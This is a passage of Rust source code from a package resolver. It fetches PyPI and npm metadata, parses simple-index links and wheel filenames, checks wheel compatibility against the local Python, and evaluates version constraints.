        "x86" | "i386" | "i586" | "i686" => "ia32",
        "aarch64" => "arm64",
        "arm" => "arm",
        "powerpc64" => "ppc64",
        "s390x" => "s390x",
        other => other,
    }
}

fn current_npm_libc() -> Option<&'static str> {
    #[cfg(all(target_os = "linux", target_env = "musl"))]
    {
        Some("musl")
    }
    #[cfg(all(target_os = "linux", target_env = "gnu"))]
    {
        Some("glibc")
    }
    #[cfg(not(any(
        all(target_os = "linux", target_env = "musl"),
        all(target_os = "linux", target_env = "gnu")
    )))]
    {
        None
    }
}

fn resolve_pypi(
    client: &Client,
    spec: &PackageSpec,
    options: &LinkOptions,
) -> Result<ResolvedPackage> {
    if spec.direct_url.is_some() {
        return resolve_pypi_direct_wheel(spec);
    }
    let target_python = current_python_version();
    let mut candidates =
        pypi_find_link_candidates(client, spec, options, target_python.as_deref())?;
    let simple_indexes = pypi_simple_index_urls(options);
    if !candidates.is_empty() || options.pypi_no_index {
        if !options.pypi_no_index {
            let indexes = if simple_indexes.is_empty() {
                vec!["https://pypi.org/simple/".to_owned()]
            } else {
                simple_indexes
            };
            candidates.extend(pypi_simple_index_candidates_from_indexes(
                client,
                spec,
                &indexes,
                target_python.as_deref(),
            )?);
        }
        return pypi_candidate_to_resolved(spec, options, candidates);
    }
    if !simple_indexes.is_empty() {
        let candidates = pypi_simple_index_candidates_from_indexes(
            client,
            spec,
            &simple_indexes,
            target_python.as_deref(),
        )?;
        return pypi_candidate_to_resolved(spec, options, candidates);
    }

    let encoded = urlencoding::encode(&spec.name);
    let constrained_requirement = constrained_pypi_requirement(spec, &options.constraints);
    let version = match constrained_requirement.as_deref() {
        Some(requirement) if is_exact_pypi_version(requirement) => requirement.to_owned(),
        Some(requirement) => {
            let url = format!("https://pypi.org/pypi/{encoded}/json");
            let root = client
                .get(url)
                .send()?
                .error_for_status()?
                .json::<PypiRoot>()?;
            choose_pypi_version(&spec.name, requirement, &root, target_python.as_deref())?
        }
        None => {
            let url = format!("https://pypi.org/pypi/{encoded}/json");
            let root = client
                .get(url)
                .send()?
                .error_for_status()?
                .json::<PypiRoot>()?;
            root.info.version
        }
    };
    let url = format!("https://pypi.org/pypi/{encoded}/{version}/json");
    let response = client.get(url).send()?;
    if response.status().as_u16() == 404 {
        return Err(OmcRegistryError::PackageNotFound(spec.requested()));
    }
    let doc = response.error_for_status()?.json::<PypiResponse>()?;
    let file = choose_pypi_file(&doc, target_python.as_deref())
        .ok_or_else(|| OmcRegistryError::MissingCompatibleWheel(spec.requested()))?;
    let source_url = file.url.clone();
    let filename = file.filename.clone();
    let expected_sha256 = file.digests.sha256.clone();
    let dependencies = doc
        .info
        .requires_dist
        .unwrap_or_default()
        .into_iter()
        .filter_map(|requirement| parse_pypi_requirement_with_extras(&requirement, &spec.extras))
        .map(|spec| PackageDependency {
            spec,
            optional: false,
        })
        .collect::<Vec<_>>();

    Ok(ResolvedPackage {
        ecosystem: Ecosystem::Pypi,
        name: doc.info.name,
        version: doc.info.version,
        source_url,
        download_url: None,
        local_path: None,
        filename,
        expected_sha256: Some(expected_sha256),
        expected_sha1: None,
        expected_integrity: None,
        npm_direct_tarball: false,
        pypi_direct_wheel: false,
        npm_scripts: BTreeMap::new(),
        platform_compatible: true,
        dependencies,
    })
}

fn pypi_simple_index_urls(options: &LinkOptions) -> Vec<String> {
    if options.pypi_index_url.is_none() && options.pypi_extra_index_urls.is_empty() {
        return Vec::new();
    }
    let mut indexes = Vec::new();
    indexes.push(
        options
            .pypi_index_url
            .clone()
            .unwrap_or_else(|| "https://pypi.org/simple/".to_owned()),
    );
    indexes.extend(options.pypi_extra_index_urls.clone());
    let mut seen = BTreeSet::new();
    indexes.retain(|index| seen.insert(index.clone()));
    indexes
}

fn pypi_simple_index_candidates_from_indexes(
    client: &Client,
    spec: &PackageSpec,
    indexes: &[String],
    target_python: Option<&str>,
) -> Result<Vec<PypiSimpleCandidate>> {
    let mut candidates = Vec::new();
    for index in indexes {
        let url = pypi_simple_package_url(index, &spec.name)?;
        let response = client.get(url).send()?;
        if response.status().as_u16() == 404 {
            continue;
        }
        let base_url = response.url().clone();
        let html = response.error_for_status()?.text()?;
        candidates.extend(pypi_simple_index_candidates(
            &base_url,
            &html,
            &spec.name,
            target_python,
        ));
    }
    Ok(candidates)
}

fn pypi_candidate_to_resolved(
    spec: &PackageSpec,
    options: &LinkOptions,
    candidates: Vec<PypiSimpleCandidate>,
) -> Result<ResolvedPackage> {
    let requirement =
        constrained_pypi_requirement(spec, &options.constraints).unwrap_or_else(|| "*".to_owned());

    let candidate = candidates
        .into_iter()
        .filter(|candidate| pypi_version_satisfies(&candidate.version, &requirement))
        .max_by(|left, right| compare_pypi_versions(&left.version, &right.version))
        .ok_or_else(|| OmcRegistryError::UnsatisfiedRequirement {
            name: spec.name.clone(),
            requirement,
        })?;

    Ok(ResolvedPackage {
        ecosystem: Ecosystem::Pypi,
        name: spec.name.clone(),
        version: candidate.version,
        source_url: candidate.url,
        download_url: candidate.download_url,
        local_path: candidate.local_path,
        filename: candidate.filename,
        expected_sha256: candidate.sha256,
        expected_sha1: None,
        expected_integrity: None,
        npm_direct_tarball: false,
        pypi_direct_wheel: true,
        npm_scripts: BTreeMap::new(),
        platform_compatible: true,
        dependencies: Vec::new(),
    })
}

fn pypi_simple_package_url(index: &str, package: &str) -> Result<reqwest::Url> {
    let base = reqwest::Url::parse(index)
        .map_err(|_| OmcRegistryError::UnsupportedSpec(index.to_owned()))?;
    base.join(&format!("{}/", normalize_pypi_name(package)))
        .map_err(|_| OmcRegistryError::UnsupportedSpec(index.to_owned()))
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct PypiSimpleCandidate {
    url: String,
    download_url: Option<String>,
    local_path: Option<PathBuf>,
    filename: String,
    version: String,
    sha256: Option<String>,
}

fn pypi_find_link_candidates(
    client: &Client,
    spec: &PackageSpec,
    options: &LinkOptions,
    target_python: Option<&str>,
) -> Result<Vec<PypiSimpleCandidate>> {
    let mut candidates = Vec::new();
    for source in &options.pypi_find_links {
        candidates.extend(pypi_find_link_source_candidates(
            client,
            source,
            &spec.name,
            target_python,
        )?);
    }
    Ok(candidates)
}

fn pypi_find_link_source_candidates(
    client: &Client,
    source: &str,
    package: &str,
    target_python: Option<&str>,
) -> Result<Vec<PypiSimpleCandidate>> {
    if let Ok(url) = reqwest::Url::parse(source) {
        return match url.scheme() {
            "http" | "https" => pypi_http_find_link_candidates(client, url, package, target_python),
            "file" => {
                let Ok(path) = url.to_file_path() else {
                    return Ok(Vec::new());
                };
                pypi_local_find_link_candidates(&path, package, target_python)
            }
            _ => Ok(Vec::new()),
        };
    }
    pypi_local_find_link_candidates(Path::new(source), package, target_python)
}

fn pypi_http_find_link_candidates(
    client: &Client,
    url: reqwest::Url,
    package: &str,
    target_python: Option<&str>,
) -> Result<Vec<PypiSimpleCandidate>> {
    if url
        .path_segments()
        .and_then(|mut segments| segments.next_back())
        .map(|filename| filename.ends_with(".whl"))
        .unwrap_or(false)
    {
        return Ok(
            pypi_candidate_from_url(url, package, None, target_python, None)
                .into_iter()
                .collect(),
        );
    }

    let response = client.get(url).send()?;
    if response.status().as_u16() == 404 {
        return Ok(Vec::new());
    }
    let base_url = response.url().clone();
    let html = response.error_for_status()?.text()?;
    Ok(pypi_simple_index_candidates(
        &base_url,
        &html,
        package,
        target_python,
    ))
}

fn pypi_local_find_link_candidates(
    source: &Path,
    package: &str,
    target_python: Option<&str>,
) -> Result<Vec<PypiSimpleCandidate>> {
    if source.is_dir() {
        let mut candidates = Vec::new();
        for entry in fs::read_dir(source)? {
            let path = entry?.path();
            if path.is_file() {
                candidates.extend(pypi_local_find_link_candidates(
                    &path,
                    package,
                    target_python,
                )?);
            }
        }
        return Ok(candidates);
    }
    if !source.is_file() {
        return Ok(Vec::new());
    }
    if source.extension().and_then(|ext| ext.to_str()) == Some("whl") {
        return Ok(pypi_local_wheel_candidate(source, package, target_python)
            .into_iter()
            .collect());
    }

    let html = fs::read_to_string(source)?;
    let Ok(base_url) = reqwest::Url::from_file_path(source) else {
        return Ok(Vec::new());
    };
    let mut candidates = pypi_simple_index_candidates(&base_url, &html, package, target_python);
    for candidate in &mut candidates {
        if candidate.local_path.is_none() {
            if let Ok(url) = reqwest::Url::parse(&candidate.url) {
                if url.scheme() == "file" {
                    candidate.local_path = url.to_file_path().ok();
                }
            }
        }
    }
    Ok(candidates)
}

fn pypi_local_wheel_candidate(
    path: &Path,
    package: &str,
    target_python: Option<&str>,
) -> Option<PypiSimpleCandidate> {
    let url = reqwest::Url::from_file_path(path).ok()?;
    pypi_candidate_from_url(url, package, None, target_python, Some(path.to_path_buf()))
}

fn pypi_simple_index_candidates(
    base_url: &reqwest::Url,
    html: &str,
    package: &str,
    target_python: Option<&str>,
) -> Vec<PypiSimpleCandidate> {
    simple_index_links(base_url, html)
        .into_iter()
        .filter_map(|link| {
            pypi_candidate_from_url(
                link.url,
                package,
                link.requires_python.as_deref(),
                target_python,
                None,
            )
        })
        .collect()
}

fn pypi_candidate_from_url(
    mut url: reqwest::Url,
    package: &str,
    requires_python: Option<&str>,
    target_python: Option<&str>,
    local_path: Option<PathBuf>,
) -> Option<PypiSimpleCandidate> {
    let filename = url
        .path_segments()
        .and_then(|mut segments| segments.next_back())
        .and_then(|filename| urlencoding::decode(filename).ok())
        .map(|filename| filename.into_owned())?;
    let (name, version) = parse_wheel_name_and_version(&filename)?;
    if name != normalize_pypi_name(package) {
        return None;
    }
    if !requires_python
        .map(|requirement| {
            target_python
                .map(|target_python| pypi_version_satisfies(target_python, requirement))
                .unwrap_or(true)
        })
        .unwrap_or(true)
    {
        return None;
    }
    if !current_python_wheel_compatibility()
        .as_ref()
        .map(|compatibility| wheel_tag_compatible(&filename, compatibility))
        .unwrap_or(true)
    {
        return None;
    }
    let sha256 = url.fragment().and_then(simple_index_sha256_fragment);
    url.set_fragment(None);
    let mut source_url = url.clone();
    strip_url_credentials(&mut source_url);
    let download_url = (source_url != url).then(|| url.to_string());
    Some(PypiSimpleCandidate {
        url: source_url.to_string(),
        download_url,
        local_path,
        filename,
        version,
        sha256,
    })
}

#[derive(Debug, Clone)]
struct SimpleIndexLink {
    url: reqwest::Url,
    requires_python: Option<String>,
}

fn simple_index_links(base_url: &reqwest::Url, html: &str) -> Vec<SimpleIndexLink> {
    let mut links = Vec::new();
    let mut rest = html;
    while let Some(start) = rest.to_ascii_lowercase().find("<a") {
        rest = &rest[start..];
        let Some(end) = rest.find('>') else {
            break;
        };
        let tag = &rest[..=end];
        rest = &rest[end + 1..];
        let Some(href) = html_attr(tag, "href") else {
            continue;
        };
        let Ok(mut url) = base_url.join(&html_unescape(&href)) else {
            continue;
        };
        inherit_url_credentials(base_url, &mut url);
        links.push(SimpleIndexLink {
            url,
            requires_python: html_attr(tag, "data-requires-python")
                .map(|value| html_unescape(&value)),
        });
    }
    links
}

fn inherit_url_credentials(base_url: &reqwest::Url, url: &mut reqwest::Url) {
    if base_url.username().is_empty()
        || !url.username().is_empty()
        || base_url.scheme() != url.scheme()
        || base_url.host_str() != url.host_str()
        || base_url.port_or_known_default() != url.port_or_known_default()
    {
        return;
    }

    let _ = url.set_username(base_url.username());
    let _ = url.set_password(base_url.password());
}

fn strip_url_credentials(url: &mut reqwest::Url) {
    let _ = url.set_username("");
    let _ = url.set_password(None);
}

fn html_attr(tag: &str, attr: &str) -> Option<String> {
    let lower = tag.to_ascii_lowercase();
    let needle = format!("{attr}=");
    let start = lower.find(&needle)? + needle.len();
    let rest = &tag[start..];
    let quote = rest.chars().next()?;
    if quote == '"' || quote == '\'' {
        let value = &rest[quote.len_utf8()..];
        let end = value.find(quote)?;
        Some(value[..end].to_owned())
    } else {
        let end = rest
            .find(|ch: char| ch.is_whitespace() || ch == '>')
            .unwrap_or(rest.len());
        Some(rest[..end].to_owned())
    }
}

fn html_unescape(value: &str) -> String {
    value
        .replace("&amp;", "&")
        .replace("&lt;", "<")
        .replace("&gt;", ">")
        .replace("&quot;", "\"")
        .replace("&#39;", "'")
}

fn simple_index_sha256_fragment(fragment: &str) -> Option<String> {
    fragment
        .split('&')
        .filter_map(|part| {
            let (key, value) = part.split_once('=')?;
            (key.eq_ignore_ascii_case("sha256"))
                .then(|| normalize_sha256_hash(&format!("sha256:{value}")))
                .flatten()
        })
        .next()
}

fn resolve_pypi_direct_wheel(spec: &PackageSpec) -> Result<ResolvedPackage> {
    let source_url = spec
        .direct_url
        .clone()
        .ok_or_else(|| OmcRegistryError::UnsupportedSpec(spec.requested()))?;
    let url = reqwest::Url::parse(&source_url)
        .map_err(|_| OmcRegistryError::UnsupportedSpec(spec.requested()))?;
    let local_path = match url.scheme() {
        "https" => None,
        "file" => Some(url.to_file_path().map_err(|_| {
            OmcRegistryError::UnsupportedSpec(format!(
                "direct PyPI wheel URL for `{}` must use a valid file URL",
                spec.name
            ))
        })?),
        _ => {
            return Err(OmcRegistryError::UnsupportedSpec(format!(
                "direct PyPI wheel URL for `{}` must use https or file",
                spec.name
            )));
        }
    };
    let filename = url
        .path_segments()
        .and_then(|mut segments| segments.next_back())
        .and_then(|filename| urlencoding::decode(filename).ok())
        .map(|filename| filename.into_owned())
        .ok_or_else(|| OmcRegistryError::UnsupportedSpec(spec.requested()))?;
    let (wheel_name, version) = parse_wheel_name_and_version(&filename)
        .ok_or_else(|| OmcRegistryError::UnsupportedSpec(spec.requested()))?;
    if wheel_name != spec.name {
        return Err(OmcRegistryError::UnsupportedSpec(format!(
            "direct wheel filename `{filename}` does not match `{}`",
            spec.name
        )));
    }
    if !current_python_wheel_compatibility()
        .as_ref()
        .map(|compatibility| wheel_tag_compatible(&filename, compatibility))
        .unwrap_or(true)
    {
        return Err(OmcRegistryError::MissingCompatibleWheel(spec.requested()));
    }

    Ok(ResolvedPackage {
        ecosystem: Ecosystem::Pypi,
        name: spec.name.clone(),
        version,
        source_url,
        download_url: None,
        local_path,
        filename,
        expected_sha256: None,
        expected_sha1: None,
        expected_integrity: None,
        npm_direct_tarball: false,
        pypi_direct_wheel: true,
        npm_scripts: BTreeMap::new(),
        platform_compatible: true,
        dependencies: Vec::new(),
    })
}

fn parse_wheel_name_and_version(filename: &str) -> Option<(String, String)> {
    let filename = filename.strip_suffix(".whl")?;
    let parts = filename.split('-').collect::<Vec<_>>();
    if parts.len() < 5 {
        return None;
    }
    Some((normalize_pypi_name(parts[0]), parts[1].to_owned()))
}

fn constrained_pypi_requirement(
    spec: &PackageSpec,
    constraints: &BTreeMap<String, String>,
) -> Option<String> {
    constrained_requirement(spec, constraints)
}

fn constrained_npm_requirement(
    spec: &PackageSpec,
    requirement: Option<&str>,
    constraints: &BTreeMap<String, String>,
) -> Option<String> {
    match (requirement, constraints.get(&spec.constraint_key())) {
        (Some(requirement), Some(constraint)) if !requirement.trim().is_empty() => {
            Some(format!("{requirement},{constraint}"))
        }
        (Some(requirement), None) => Some(requirement.to_owned()),
        (_, Some(constraint)) => Some(constraint.clone()),
        (None, None) => None,
    }
}

fn constrained_requirement(
    spec: &PackageSpec,
    constraints: &BTreeMap<String, String>,
) -> Option<String> {
    match (
        spec.version.as_deref(),
        constraints.get(&spec.constraint_key()),
    ) {
        (Some(requirement), Some(constraint)) if !requirement.trim().is_empty() => {
            Some(format!("{requirement},{constraint}"))
        }
        (Some(requirement), None) => Some(requirement.to_owned()),
        (_, Some(constraint)) => Some(constraint.clone()),
        (None, None) => None,
    }
}

fn choose_pypi_file<'a>(
    doc: &'a PypiResponse,
    target_python: Option<&str>,
) -> Option<&'a PypiFile> {
    doc.urls
        .iter()
        .filter(|file| pypi_file_python_compatible(file, target_python))
        .find(|file| file.packagetype == "bdist_wheel" && file.filename.contains("py3-none-any"))
        .or_else(|| {
            doc.urls
                .iter()
                .filter(|file| pypi_file_python_compatible(file, target_python))
                .find(|file| file.packagetype == "bdist_wheel")
        })
}

fn choose_npm_version(name: &str, requirement: &str, root: &NpmRoot) -> Result<String> {
    if requirement == "latest" {
        return Ok(root.dist_tags.latest.clone());
    }

    root.versions
        .keys()
        .filter(|version| npm_version_satisfies(version, requirement))
        .max_by(|left, right| compare_npm_versions(left, right))
        .cloned()
        .ok_or_else(|| OmcRegistryError::UnsatisfiedRequirement {
            name: name.to_owned(),
            requirement: requirement.to_owned(),
        })
}

fn is_exact_npm_version(requirement: &str) -> bool {
    Version::parse(requirement).is_ok()
}

fn npm_version_satisfies(version: &str, requirement: &str) -> bool {
    let raw_version = version.trim();
    let Ok(version) = Version::parse(version) else {
        return false;
    };
    let requirement = requirement.trim();

    if requirement.is_empty() || requirement == "*" || requirement == "latest" {
        return true;
    }
    if let Ok(exact) = Version::parse(requirement) {
        return version == exact;
    }
    let parts = requirement
        .replace(',', " ")
        .split_whitespace()
        .map(str::to_owned)
        .collect::<Vec<_>>();
    if parts.len() > 1 {
        return parts
            .iter()
            .all(|part| npm_version_satisfies(raw_version, part));
    }
    if let Some(base) = requirement
        .strip_prefix('^')
        .and_then(parse_partial_npm_version)
    {
        let upper = if base.major > 0 {
            Version::new(base.major + 1, 0, 0)
        } else if base.minor > 0 {
            Version::new(0, base.minor + 1, 0)
        } else {
            Version::new(0, 0, base.patch + 1)
        };
        return version >= base && version < upper;
    }
    if let Some(base) = requirement
        .strip_prefix('~')
        .and_then(parse_partial_npm_version)
    {
        let upper = Version::new(base.major, base.minor + 1, 0);
        return version >= base && version < upper;
    }

    requirement
        .replace(',', " ")
        .split_whitespace()
        .all(|part| npm_comparator_satisfied(&version, part))
}

fn npm_comparator_satisfied(version: &Version, comparator: &str) -> bool {
    for op in [">=", "<=", ">", "<", "="] {
        if let Some(raw) = comparator.strip_prefix(op) {
            let Some(required) = parse_partial_npm_version(raw) else {
                return false;
            };
            return match op {
                ">=" => version >= &required,
                "<=" => version <= &required,
                ">" => version > &required,
                "<" => version < &required,
                "=" => version == &required,
                _ => false,
            };
        }
    }

    if comparator == "*" || comparator.eq_ignore_ascii_case("x") {
        true
    } else if comparator.ends_with(".x") || comparator.ends_with(".*") {
        let prefix = comparator.trim_end_matches('x').trim_end_matches('*');
        version.to_string().starts_with(prefix)
    } else {
        parse_partial_npm_version(comparator)
            .map(|required| version == &required)
            .unwrap_or(false)
    }
}

fn parse_partial_npm_version(raw: &str) -> Option<Version> {
    let mut parts = raw.trim().split('.');
    let major = parts.next()?.parse().ok()?;
    let minor = parts.next().and_then(|part| part.parse().ok()).unwrap_or(0);
    let patch = parts.next().and_then(|part| part.parse().ok()).unwrap_or(0);
    Some(Version::new(major, minor, patch))
}

fn compare_npm_versions(left: &str, right: &str) -> std::cmp::Ordering {
    match (Version::parse(left), Version::parse(right)) {
        (Ok(left), Ok(right)) => left.cmp(&right),
        _ => left.cmp(right),
    }
}

fn choose_pypi_version(
    name: &str,
    requirement: &str,
    root: &PypiRoot,
    target_python: Option<&str>,
) -> Result<String> {
    root.releases
        .iter()
        .filter(|(_, files)| {
            files
                .iter()
                .any(|file| pypi_file_python_compatible(file, target_python))
        })
        .map(|(version, _)| version)
        .filter(|version| pypi_version_satisfies(version, requirement))
        .max_by(|left, right| compare_pypi_versions(left, right))
        .cloned()
        .ok_or_else(|| OmcRegistryError::UnsatisfiedRequirement {
            name: name.to_owned(),
            requirement: requirement.to_owned(),
        })
}

fn is_exact_pypi_version(requirement: &str) -> bool {
    !requirement
        .chars()
        .any(|ch| matches!(ch, '<' | '>' | '=' | '!' | '~' | ',' | '*' | ' '))
}

fn pypi_version_satisfies(version: &str, requirement: &str) -> bool {
    let requirement = requirement.trim();
    if requirement.is_empty() || requirement == "*" {
        return true;
    }

    requirement
        .trim_matches(|ch| ch == '(' || ch == ')')
        .split(',')
        .map(str::trim)
        .filter(|part| !part.is_empty())
        .all(|part| pypi_comparator_satisfied(version, part))
}

fn pypi_file_python_compatible(file: &PypiFile, target_python: Option<&str>) -> bool {
    let python_compatible = target_python
        .and_then(|target_python| {
            file.requires_python
                .as_deref()
                .map(|requirement| pypi_version_satisfies(target_python, requirement))
        })
        .unwrap_or(true);
    if !python_compatible {
        return false;
    }

    if file.packagetype != "bdist_wheel" {
        return true;
    }

    current_python_wheel_compatibility()
        .as_ref()
        .map(|compatibility| wheel_tag_compatible(&file.filename, compatibility))
        .unwrap_or(true)
}

fn current_python_version() -> Option<String> {
    static CURRENT_PYTHON_VERSION: OnceLock<Option<String>> = OnceLock::new();
    CURRENT_PYTHON_VERSION
        .get_or_init(detect_python_version)
        .clone()
}

fn current_python_wheel_compatibility() -> Option<PythonWheelCompatibility> {
    static CURRENT_PYTHON_WHEEL_COMPATIBILITY: OnceLock<Option<PythonWheelCompatibility>> =
        OnceLock::new();
    CURRENT_PYTHON_WHEEL_COMPATIBILITY
        .get_or_init(detect_python_wheel_compatibility)
        .clone()
}

fn detect_python_version() -> Option<String> {
    let output = Command::new("python3")
        .arg("-c")
        .arg(
            "import sys; print(f'{sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}')",
        )
        .output()
        .ok()?;
    if !output.status.success() {
        return None;
    }
    let version = String::from_utf8(output.stdout).ok()?.trim().to_owned();
    (!version.is_empty()).then_some(version)
}

fn detect_python_wheel_compatibility() -> Option<PythonWheelCompatibility> {
    let output = Command::new("python3")
        .arg("-c")
        .arg(
            r#"import platform, sys, sysconfig
print(sys.version_info.major)
print(sys.version_info.minor)
print(sys.implementation.name)
print(sys.implementation.cache_tag or "")
print(sysconfig.get_platform())
print(platform.machine())
print(platform.mac_ver()[0])
"#,
        )
        .output()
        .ok()?;
    if !output.status.success() {
        return None;
    }
    let stdout = String::from_utf8(output.stdout).ok()?;
    let mut lines = stdout.lines();
    let major = lines.next()?.trim().parse::<u64>().ok()?;
    let minor = lines.next()?.trim().parse::<u64>().ok()?;
    let implementation = lines.next()?.trim().to_owned();
    let cache_tag = lines.next()?.trim().to_owned();
    let platform = normalize_wheel_platform(lines.next()?.trim());
    let machine = normalize_wheel_platform(lines.next()?.trim());
    let mac_version = lines.next().unwrap_or_default().trim().to_owned();

    Some(PythonWheelCompatibility::new(
        major,
        minor,
        &implementation,
        &cache_tag,
        &platform,
        &machine,
        &mac_version,
    ))
}

#[derive(Debug, Clone)]
struct PythonWheelCompatibility {
    python_tags: BTreeSet<String>,
    abi_tags: BTreeSet<String>,
    platform_tags: BTreeSet<String>,
}

impl PythonWheelCompatibility {
    fn new(
        major: u64,
        minor: u64,
        implementation: &str,
        cache_tag: &str,
        platform: &str,
        machine: &str,
        mac_version: &str,
    ) -> Self {
        let mut python_tags = BTreeSet::from([format!("py{major}"), format!("py{major}{minor}")]);
        let mut abi_tags = BTreeSet::from(["none".to_owned(), "abi3".to_owned()]);
        if implementation == "cpython" {
            let cp_tag = format!("cp{major}{minor}");
            python_tags.insert(cp_tag.clone());
            abi_tags.insert(cp_tag);
        }
        if let Some(cache_tag) = cache_tag
            .strip_prefix("cpython-")
            .map(|tag| format!("cp{}", tag.replace('-', "")))
        {
            python_tags.insert(cache_tag.clone());
            abi_tags.insert(cache_tag);
        }

        let mut platform_tags = BTreeSet::from(["any".to_owned()]);
        if !platform.is_empty() {
            platform_tags.insert(platform.to_owned());
        }
        platform_tags.extend(macos_platform_tags(platform, machine, mac_version));

        Self {
            python_tags,
            abi_tags,
            platform_tags,
        }
    }
}

fn macos_platform_tags(platform: &str, machine: &str, mac_version: &str) -> BTreeSet<String> {
    let mut tags = BTreeSet::new();
    if !platform.starts_with("macosx_") {
        return tags;
    }

    let current_major = mac_version
        .split('.')
        .next()
        .and_then(|part| part.parse::<u64>().ok())
        .filter(|major| *major >= 11)
        .unwrap_or(15);

    for minor in 0..=16 {
        tags.insert(format!("macosx_10_{minor}_universal2"));
        if machine == "x86_64" {
            tags.insert(format!("macosx_10_{minor}_x86_64"));
            tags.insert(format!("macosx_10_{minor}_intel"));
        }
    }

    for major in 11..=current_major {
        tags.insert(format!("macosx_{major}_0_universal2"));
        if machine == "arm64" || machine == "aarch64" {
            tags.insert(format!("macosx_{major}_0_arm64"));
        }
        if machine == "x86_64" {
            tags.insert(format!("macosx_{major}_0_x86_64"));
        }
    }

    tags
}

fn normalize_wheel_platform(value: &str) -> String {
    value.replace(['-', '.'], "_")
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct WheelTags {
    python_tags: BTreeSet<String>,
    abi_tags: BTreeSet<String>,
    platform_tags: BTreeSet<String>,
}

fn parse_wheel_tags(filename: &str) -> Option<WheelTags> {
    let stem = filename.strip_suffix(".whl")?;
    let parts = stem.rsplitn(4, '-').collect::<Vec<_>>();
    if parts.len() != 4 {
        return None;
    }

    Some(WheelTags {
        platform_tags: dot_tags(parts[0]),
        abi_tags: dot_tags(parts[1]),
        python_tags: dot_tags(parts[2]),
    })
}

fn dot_tags(value: &str) -> BTreeSet<String> {
    value.split('.').map(str::to_owned).collect()
}

fn wheel_tag_compatible(filename: &str, compatibility: &PythonWheelCompatibility) -> bool {
    let Some(tags) = parse_wheel_tags(filename) else {
        return false;
    };

    tags.python_tags
        .iter()
        .any(|tag| compatibility.python_tags.contains(tag))
        && tags
            .abi_tags
            .iter()
            .any(|tag| compatibility.abi_tags.contains(tag))
        && tags
            .platform_tags
            .iter()
            .any(|tag| compatibility.platform_tags.contains(tag))
}

fn pypi_comparator_satisfied(version: &str, comparator: &str) -> bool {
    for op in [">=", "<=", "==", "!=", "~=", ">", "<"] {
        if let Some(required) = comparator.strip_prefix(op) {
            let ordering = compare_pypi_versions(version, required.trim());
            return match op {
                ">=" => ordering.is_ge(),
                "<=" => ordering.is_le(),
                "==" => ordering.is_eq(),
                "!=" => !ordering.is_eq(),
                ">" => ordering.is_gt(),
                "<" => ordering.is_lt(),
                "~=" => ordering.is_ge(),
                _ => false,
            };
        }
    }

    compare_pypi_versions(version, comparator).is_eq()
}

fn compare_pypi_versions(left: &str, right: &str) -> std::cmp::Ordering {
    comparable_version(left).cmp(&comparable_version(right))
}

fn comparable_version(version: &str) -> Vec<u64> {
    version
        .split(|ch: char| !ch.is_ascii_digit())
        .filter(|part| !part.is_empty())
        .map(|part| part.parse().unwrap_or(0))
        .collect()
}

fn parse_pypi_requirement(requirement: &str) -> Option<PackageSpec> {
    parse_pypi_requirement_with_extras(requirement, &BTreeSet::new())
}

fn parse_pypi_direct_requirement(
    requirement: &str,
    active_extras: &BTreeSet<String>,
) -> Option<(PackageSpec, BTreeSet<String>)> {
    let mut parts = requirement.splitn(2, ';');
    let requirement = parts.next()?.trim();
    if let Some(marker) = parts.next() {
        if !pypi_marker_applies(marker, active_extras) {
            return None;
        }
    }

    let (name, url) = requirement.split_once(" @ ")?;
    let (name, extras) = parse_pypi_name_and_extras(name.trim());
    if name.is_empty() {
        return None;
    }
    let (url, hashes) = direct_requirement_url_and_hashes(url.trim());
    if !url.contains("://") {
        return None;
    }
    Some((
        PackageSpec::with_direct_url(Ecosystem::Pypi, name, url, extras),
        hashes,
    ))
}

fn direct_requirement_url_and_hashes(url: &str) -> (String, BTreeSet<String>) {
    let Some((url, fragment)) = url.split_once('#') else {
        return (url.to_owned(), BTreeSet::new());
    };
    let hashes = fragment
        .split('&')
        .filter_map(|part| {
            let (key, value) = part.split_once('=')?;
            if key != "sha256" {
                return None;
            }
            normalize_sha256_hash(&format!("sha256:{value}"))
        })
        .collect();
    (url.to_owned(), hashes)
}

fn parse_pypi_requirement_with_extras(
    requirement: &str,
    active_extras: &BTreeSet<String>,
) -> Option<PackageSpec> {
    let mut parts = requirement.splitn(2, ';');
    let requirement = parts.next()?.trim();
    if let Some(marker) = parts.next() {
        if !pypi_marker_applies(marker, active_extras) {
            return None;
        }
    }

    if requirement.is_empty() {
        return None;
    }

    let name_end = requirement
        .char_indices()
        .find(|(_, ch)| !ch.is_ascii_alphanumeric() && !matches!(ch, '-' | '_' | '.' | '[' | ']'))
        .map(|(index, _)| index)
        .unwrap_or(requirement.len());
    let (name, extras) = parse_pypi_name_and_extras(requirement[..name_end].trim());
    if name.is_empty() {
        return None;
    }

    let version = requirement[name_end..]
        .trim()
        .trim_start_matches('(')
        .trim_end_matches(')')
        .replace(' ', "");

    Some(PackageSpec::with_extras(
        Ecosystem::Pypi,
        name,
        (!version.is_empty()).then_some(version),
        extras,
    ))
}

fn parse_pypi_name_and_extras(name: &str) -> (String, BTreeSet<String>) {
    let Some((base, extras)) = name.split_once('[') else {
        return (normalize_pypi_name(name), BTreeSet::new());
    };
    let extras = extras
        .trim_end_matches(']')
        .split(',')
        .map(normalize_pypi_extra)
        .filter(|extra| !extra.is_empty())
        .collect::<BTreeSet<_>>();
    (normalize_pypi_name(base), extras)
}

fn normalize_pypi_name(name: &str) -> String {
    name.replace('_', "-").to_ascii_lowercase()
}

fn normalize_pypi_extra(extra: &str) -> String {
    extra.trim().replace('_', "-").to_ascii_lowercase()
}

fn parse_requirements_include(line: &str) -> Option<RequirementsInclude> {
    for (prefix, mode) in [
        ("--requirement=", RequirementsMode::Install),
        ("--constraint=", RequirementsMode::Constraint),
    ] {
        if let Some(rest) = line.strip_prefix(prefix) {
            let rest = rest.trim();
            if !rest.is_empty() {
                return Some(RequirementsInclude {
                    path: rest.to_owned(),
                    mode,
                });
            }
        }
    }

    for (prefix, mode) in [
        ("-r", RequirementsMode::Install),
        ("--requirement", RequirementsMode::Install),
        ("-c", RequirementsMode::Constraint),
        ("--constraint", RequirementsMode::Constraint),
    ] {
        if let Some(rest) = line.strip_prefix(prefix) {
            let rest = rest.trim_start();
            if rest.is_empty() {
                continue;
            }
            return Some(RequirementsInclude {
                path: rest.to_owned(),
                mode,
            });
        }
    }

    None
}

fn parse_requirements_index_url(line: &str) -> Option<String> {
    parse_requirements_option_value(line, &["--index-url=", "--index-url", "-i"])
        .and_then(|index_url| normalize_pypi_simple_index_url(&index_url))
}

